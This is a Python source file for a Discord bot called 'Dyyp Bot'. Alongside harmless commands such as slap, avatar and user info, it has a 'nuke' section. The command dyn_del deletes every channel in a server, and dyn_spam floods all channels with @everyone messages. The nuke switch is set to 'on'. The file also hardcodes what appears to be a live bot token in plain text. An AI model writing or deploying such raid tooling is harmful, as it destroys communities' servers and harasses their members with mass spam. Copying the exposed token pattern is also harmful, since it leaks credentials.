import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
bot = commands.Bot(command_prefix=commands.when_mentioned_or("!"))

#####################################
@bot.event 

async def on_ready():
    """On ready event!"""
    print("Logged in as " + str(bot.user))
    print("User ID: " + str(bot.user.id))
    print("Ready!")
#####################################

#####################################
nukeron = 'on'
token = 'MTEyOTgwMDMyMjA2NDMyMjYxMA.GW_2bI.8NxP9wxhQKCn_q_eTV96TqYGucsf9zlLgGWQ38'

#####################################


#######################################################################################FUNS:
#######################################################################################
@bot.command()
async def slap(ctx, user: discord.Member=None):
    if user is None:
        message = "I don't wanna slap you!"
    else:
        message = "{} was slapped by {}! *ouch*".format(ctx.author.mention,
                                                        user.mention)
    await ctx.send(message)

#######################################################################################Config:
#######################################################################################
##clear
@bot.command(name='dyclear', help='this command will clear msgs')
async def dyclear(ctx, amount = 5):
    await ctx.channel.purge(limit=amount+1)

##addchannel
@bot.command()
async def dyptxt(ctx, *, name=None):
    guild = ctx.message.guild
    if name == None:
        await ctx.send('Sorry, but you have to insert a name. Try again, but do it like this: `>create [channel name]`')
    else:
        x = name.split()
    if len(x)!=2:
            await ctx.send('Sorr ذ y , plz insert name of channel and number of them')
    nam = x[0]
    num = int(x[1])
    for i in range(num):
        await guild.create_text_channel(nam)
    await ctx.send(f"Created a channel named {name}")

##deletechannel

##category create
@bot.command()
async def dycatg(ctx, *, name):
    await ctx.guild.create_category(name)
################################################################################KARBORDI
#######################################################################################
##avatar:
@bot.command(pass_context=True)
async def dyavatar(ctx, user: discord.Member):
    embed=discord.Embed(title=f"Avater of {user}", color=0xFF5733)
    embed.set_image(url=user.avatar_url)
    embed.set_footer(text="Dyyp Bot!")
    await ctx.send(embed=embed)

@bot.command(pass_context=True)
async def dyuserinfo(ctx, user: discord.Member):
    
    embed = discord.Embed(title=f"{user.name}'s Info",color=0xFF5733)
    embed.add_field(name="Name", value=user.name, inline=True)
    embed.add_field(name="ID", value=user.id, inline=True)
    embed.add_field(name="Status", value=user.status, inline=True)
    embed.add_field(name="Highest role", value=user.top_role)
    embed.add_field(name="Joined At", value=user.joined_at)
    embed.set_thumbnail(url=user.avatar_url)
    embed.set_footer(text="Dyyp Bot")
    await ctx.send(embed=embed)


#######################################################################################nuke:
#######################################################################################
@bot.command()
async def dyn_del(ctx):
    await ctx.message.delete()
    if nukeron == 'off':
        await ctx.send(f"`Deleting channels is off`")
    else:
        print("[!] Deleting channels")
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()    
            except:
                pass
    guild = ctx.message.guild
    await guild.create_text_channel('GEN')

@bot.command()
async def dyn_spam(ctx,*, message):
    await ctx.message.delete()
    if message == None:
        await ctx.send('`[!] input messagetarget and numb`')
    else:
        x = message.split()
        if(len(x)!=2):
            await ctx.send('`[!] input valid`')
        else:
            mess = x[0]
            num = int(x[1])
            if nukeron == 'off':
                await ctx.send(f"`Spamming channels`")
            else:
                print("[!] Spamming channels")
                for channel in list(ctx.guild.channels):
                    try:
                        for _i in range(num): 
                            await channel.send(f"@everyone {mess}")    
                    except:
                        pass

#######################################################################################
bot.run(token)
